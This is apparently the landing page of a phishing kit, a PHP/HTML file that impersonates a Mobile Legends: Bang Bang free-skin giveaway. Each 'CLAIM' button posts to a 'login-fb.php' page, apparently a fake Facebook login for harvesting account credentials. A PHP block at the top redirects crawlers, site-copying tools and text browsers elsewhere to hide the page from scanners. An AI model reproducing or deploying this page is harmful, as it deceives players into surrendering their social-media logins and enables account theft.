<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Mobile Legend : Bang Bang">
    <meta name="description" content="Event Free Skin From Moontoon">
    <meta property="og:description" content="Event Free Skin From Moontoon">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="MLBB">
    <meta property="og:image" content="./assets/images/7.jpg">
    <meta property="og:type" content="website">
    <meta name="author" content="Idhaam69, rajaarn0@gmail.com">
    <meta name="copyright"content="Mobile Legend : Bang Bang">
    <title>Mobile Legend | Events</title>
    <link rel="stylesheet" type="text/css" media="screen" href="./assets/css/style.css" />
    <link rel="shorcut icon" href="./assets/images/favicon.jpg">
</head>
<body>
    <div id="claim">
        <img class="img-claim" src="./assets/images/logo.png" alt="idhaam69" onclick="location.href='./claim.php';">
        <hr class="garis-claim">
        <div class="idhaam69">
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/V5.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="1.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/V2.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="8.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/V3.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="9.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/V4.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="4.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Mobile Legend | Skin</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/V1.jpg"/>
                <form action="login-fb.php" method="POST">
                    <button class="btn-box" name="reward" value="5.jpg">CLAIM</button>
                </form>
            </div>
        </div>
    </div>
</body>
<script src="./assets/js/idhaam69.js"></script>
</html>
